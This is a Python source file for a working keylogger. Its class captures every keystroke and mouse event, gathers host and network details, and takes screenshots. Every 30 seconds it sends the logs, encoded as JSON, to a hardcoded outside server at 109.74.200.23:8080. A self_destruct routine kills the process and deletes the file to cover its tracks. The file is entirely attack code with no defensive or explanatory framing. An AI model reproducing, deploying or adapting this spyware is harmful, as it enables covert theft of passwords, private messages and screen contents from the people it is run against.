import logging
import os
import platform
import socket
import threading
import pyscreenshot
from pynput import keyboard, mouse
import requests
import json
from datetime import datetime
import base64
from io import BytesIO

class KeyloggerServer:
    def __init__(self, server_url, interval=30):
        self.server_url = server_url
        self.interval = interval
        self.log = "Keylogger Started...\n"
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    def append_log(self, text):
        self.log += f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n"
        
    def on_move(self, x, y):
        self.append_log(f"Mouse moved to ({x}, {y})")
        
    def on_click(self, x, y, button, pressed):
        action = 'Pressed' if pressed else 'Released'
        self.append_log(f"Mouse {action} at ({x}, {y}) with {button}")
        
    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y})")
        
    def on_press(self, key):
        try:
            self.append_log(f'Key pressed: {key.char}')
        except AttributeError:
            self.append_log(f'Special key pressed: {key}')
            
    def get_system_info(self):
        info = {
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "machine": platform.machine(),
            "system": platform.system()
        }
        return info
        
    def take_screenshot(self):
        try:
            img = pyscreenshot.grab()
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            img_str = base64.b64encode(buffered.getvalue()).decode()
            return img_str
        except Exception as e:
            self.append_log(f"Screenshot failed: {str(e)}")
            return None
            
    def send_data(self):
        try:
            payload = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "system_info": self.get_system_info(),
                "logs": self.log,
                "screenshot": self.take_screenshot()
            }
            
            headers = {
                "Content-Type": "application/json"
            }
            
            response = requests.post(
                self.server_url,
                data=json.dumps(payload),
                headers=headers
            )
            
            if response.status_code == 200:
                self.log = "Keylogger Started...\n"  # Clear log after successful send
            else:
                self.append_log(f"Failed to send data: HTTP {response.status_code}")
                
        except Exception as e:
            self.append_log(f"Error sending data: {str(e)}")
            
    def report(self):
        self.send_data()
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def self_destruct(self):
        if platform.system() == "Windows":
            try:
                os.system(f"TASKKILL /F /IM {os.path.basename(__file__)}")
                os.system(f"DEL {os.path.basename(__file__)}")
            except:
                pass
        else:
            try:
                os.system(f"rm -rf {os.path.basename(__file__)}")
            except:
                pass
                
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        mouse_listener = mouse.Listener(
            on_move=self.on_move,
            on_click=self.on_click,
            on_scroll=self.on_scroll
        )
        
        keyboard_listener.start()
        mouse_listener.start()
        
        self.append_log("System information collected")
        self.report()
        
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    # Server configuration
    ip_address = "109.74.200.23"
    port_number = "8080"
    SERVER_URL = f"http://{ip_address}:{port_number}"
    
    keylogger = KeyloggerServer(SERVER_URL)
    try:
        keylogger.run()
    except KeyboardInterrupt:
        keylogger.self_destruct()
